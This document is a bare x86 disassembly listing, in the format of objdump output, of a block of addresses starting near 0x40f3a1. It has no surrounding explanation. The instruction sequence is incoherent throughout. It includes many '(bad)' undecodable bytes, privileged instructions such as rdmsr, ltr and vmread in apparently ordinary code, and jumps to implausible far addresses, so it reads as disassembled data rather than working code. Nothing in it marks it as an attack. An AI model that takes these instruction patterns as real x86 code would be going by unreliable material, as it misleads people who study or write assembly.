  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
